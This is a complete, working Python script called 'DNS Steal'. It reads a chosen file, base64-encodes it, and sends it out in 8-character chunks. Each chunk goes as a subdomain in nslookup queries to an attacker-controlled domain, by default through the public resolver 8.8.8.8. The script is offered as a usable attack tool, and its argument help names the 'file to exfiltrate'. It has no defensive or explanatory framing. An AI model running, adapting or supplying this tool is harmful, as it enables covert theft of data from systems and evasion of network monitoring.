#! /usr/bin/env python3

import subprocess
import os
import argparse
import base64
import datetime

# declare constants
DEFAULT_DNS_IP = "8.8.8.8" # variable for the DNS server to query
LOG_ERROR_TARGET_FILE = "errors.txt" #variable for the destination file for the error log
SIZE_OF_SUBDOMAIN = 8 #variable for the number of characters in the subdomain in the DNS query

# initialize the logging file
logError = ""
currentTime = str(datetime.datetime.now())
logError = logError + currentTime + "\n"

# import arguments from the command line
parser = argparse.ArgumentParser(description="DNS Steal")

parser.add_argument("-d", "--domain", type=str, required=True, help="Attacker-controlled domain") # the domain field is required
parser.add_argument("-f", "--file", type=str, required=True, help="file path of file to exfiltrate") #the file field is required
parser.add_argument("-s", "--server", type=str, help="DNS server [IP] for querying") #this is optional

cliArguments = parser.parse_args()

if (cliArguments.server):
    dnsServer = cliArguments.server
else:
    dnsServer = DEFAULT_DNS_IP

fileWithExfilData = cliArguments.file

attackerDomain = cliArguments.domain

# open the file containing data to exfil
data = ""
try:
    if os.path.exists(fileWithExfilData):
        fileStream = open(fileWithExfilData, "r") #open the file in READ ONLY mode to prevent corruption
        data = fileStream.read()
    else:
        logError = logError + "Data target file does not exist. \n"
except:
    logError = logError + "Unknown error occurred while attempting to access the target data file. \n"

# convert the data to Base64 strings
# first encode to ASCII to strip characters that can't be base64 encoded
dataSimplified = data.encode("ascii") 
dataBase64Bytes = base64.b64encode(dataSimplified)
dataEncoded = dataBase64Bytes.decode("ascii")

# remove padding of equal signs (=), if any exist. 
# most base64 decoders can decode just fine without the padding.
if (len(dataEncoded) > 0): #error checking for empty file
    while dataEncoded[-1] == "=":
        dataEncoded = dataEncoded[:-1]

# send our DNS queries
lenOfData = len(dataEncoded)
while lenOfData >= SIZE_OF_SUBDOMAIN:
    subdomain = dataEncoded[:SIZE_OF_SUBDOMAIN]
    fullQuery = subdomain + "." + attackerDomain
    print(fullQuery)
    try:
        subprocess.run(["nslookup", fullQuery, dnsServer])
    except:
        logError = logError + "Unable to find domain: " + fullQuery + "\n"
    dataEncoded = dataEncoded[SIZE_OF_SUBDOMAIN:]
    lenOfData = len(dataEncoded) # recalculate size of the remaining data 

# send the last query, which may be shorter than SIZE_OF_SUBDOMAIN
# error check for 0
if (lenOfData != 0):
    subdomain = dataEncoded
    fullQuery = subdomain + "." + attackerDomain
    try:
        subprocess.run(["nslookup", fullQuery, dnsServer])
    except:
        logError = logError + "Error querying domain: " + fullQuery + "\n"
    print(fullQuery)

# write out error log 
with open(LOG_ERROR_TARGET_FILE, "a") as fileStreamError:
  fileStreamError.write(logError)

quit()